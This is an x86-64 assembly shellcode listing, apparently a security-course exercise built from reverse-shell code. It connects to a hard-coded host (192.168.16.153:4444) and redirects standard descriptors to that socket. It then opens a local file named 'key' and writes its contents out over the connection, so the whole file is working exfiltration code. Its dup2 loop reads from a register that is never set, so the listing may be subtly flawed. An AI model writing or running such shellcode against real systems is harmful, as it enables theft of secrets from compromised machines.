bits 64
global _start
section .text
_start:

; create socket (from reverse shell code)
  push rbp
  mov rbp,rsp
  xor rdx, rdx
  push 1
  pop rsi
  push 2
  pop rdi
  push 41
  pop rax ; sys_socket
  syscall
  
; make struct and call connect
  sub rsp, 8
  mov dword [rsp], 0xc1df0002 ; Port 4444, 4Bytes: 0xPORT + Fill with '0's + 2
  mov dword [rsp+4], 0x9910a8c0 ; IP Address 192.168.16.153, 4Bytes: 0xIPAddress (Little Endiannes)
  lea rsi, [rsp]
  add rsp, 8
  pop rbx
  xor rbx, rbx
  push 16
  pop rdx
  push 3
  pop rdi
  push 42
  pop rax; sys_connect
  syscall

;dupe connections
  xor r8, r8
  mov r8, 2 ; start at stderr and dup/dec down to zero
  .loop_fd:
      mov rdi, r9
      mov rax, 33 ;dup2
      mov rsi, r8
      syscall
  dec r8
  jns .loop_fd ;jump not sign-> checks sign flag
  

xor r15, r15 ; for the fd

;open
  push 0x79656b
  mov rdi, rsp
  xor rsi, rsi ; flags = O_RDONLY
  mov rdx, rsi ; mode = NULL
  xor rax, rax
  mov rax, 2	; = 2
  syscall
  mov r15, rax
  
loop_in: 
  ; read syscall args
  mov rdi, r15 ;fd from open
  lea rsi, [rsp-1] ;store a byte at [rsp-1]
  mov rdx, 1
  mov rax, 0 
  syscall

  ; check for input
  cmp rax, 1
  jne end

loop_out:
  ; write syscall args
  mov rdi, 1 ;write to stdout
  lea rsi, [rsp-1]
  mov rdx, 1
  mov rax, 1 
  syscall

  cmp rax, 1
  jne end

  jmp loop_in ; start over

end:
  ; exit
  mov edi, 0
  mov eax, 60
  syscall


  
